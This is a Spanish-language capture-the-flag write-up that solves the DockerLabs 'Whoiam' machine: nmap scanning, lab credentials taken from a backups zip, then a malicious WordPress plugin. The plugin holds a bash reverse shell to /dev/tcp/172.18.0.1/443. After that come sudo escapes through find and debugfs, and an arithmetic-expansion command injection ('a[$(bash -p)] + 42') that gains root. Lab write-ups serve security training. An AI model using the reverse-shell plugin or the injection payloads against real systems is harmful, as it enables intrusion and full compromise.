#MAQUINA #DOCKERLABS #FACIL 
#COMANDOS_COMPARACION_SCRIPT_BASH
<hr>

# RECONOCIMIENTO

Vamos a resolver **Whoiam** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.18.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.18.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 12:09 CET
Initiating ARP Ping Scan at 12:09
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 12:09, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:09
Scanning 172.18.0.2 [65535 ports]
Discovered open port 80/tcp on 172.18.0.2
Completed SYN Stealth Scan at 12:09, 0.58s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-12-09 12:09:46 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.18.0.2                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 12:10 CET
Nmap scan report for 172.18.0.2
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: WordPress 6.5.4
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Whoiam
MAC Address: 02:42:AC:12:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds



```

   ```bash

nmap --script="http-enum" 172.18.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 12:10 CET
Nmap scan report for 172.18.0.2
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /backups/: Backup folder w/ directory listing
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 6.5.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds

whatweb "http://172.18.0.2/"                             
http://172.18.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.18.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], Script, Title[Whoiam], UncommonHeaders[link], WordPress[6.5.4] 

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:**  **wordpress** y directorio **backups**.
## HTTP (80)

Al ver que hay en el directorio backups, hay un zip que si nos descargamos tenemos las credenciales de developer:

**Usuario -> developer**
**Contra -> 2wmy3KrGDRD%RsA7Ty5n71L^**
# EXPLOTACION

Nos registramos como developer (http://172.18.0.2/wp-login.php).

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.18.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
www-data@be07441fc421:/var/www/html/wp-admin$ sudo -l
Matching Defaults entries for www-data on be07441fc421:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on be07441fc421:
    (rafa) NOPASSWD: /usr/bin/find

```

Vemos **find** con permisos SUDO :
   ```bash
www-data@be07441fc421:/var/www/html/wp-admin$     sudo -u rafa find . -exec /bin/sh \; -quit
$ whoami
rafa
```

YA ESTAMOS COMO RAFA.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
$ sudo -l
Matching Defaults entries for rafa on be07441fc421:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rafa may run the following commands on be07441fc421:
    (ruben) NOPASSWD: /usr/sbin/debugfs


```

Vemos **debugfs** con permisos SUDO :
   ```bash
$ sudo -u ruben debugfs
debugfs 1.47.0 (5-Feb-2023)
debugfs:  !/bin/sh
$ whoami
ruben

```

YA ESTAMOS COMO RUBEN.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
$ sudo -l
Matching Defaults entries for ruben on be07441fc421:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ruben may run the following commands on be07441fc421:
    (ALL) NOPASSWD: /bin/bash /opt/penguin.sh



```

Vemos **/opt/penguin.sh** con permisos SUDO al ejecutarlo con bash :
   ```bash

ruben@be07441fc421:/var/www/html/wp-admin$ sudo /bin/bash /opt/penguin.sh 
Enter guess: a[$(bash -p)] + 42
root@be07441fc421:/var/www/html/wp-admin# whoami
root@be07441fc421:/var/www/html/wp-admin# 

```

Hay una mala sanitizacion del código, lo que permite ejecutar comandos. 

Lo que hacemos es declarar un array no inicializado anteriormente que tiene que ejecutar la sentencia. La necesita ejecutar para saber que posición devolver y luego sumarle 42.

**YA ESTAMOS COMO ROOT.**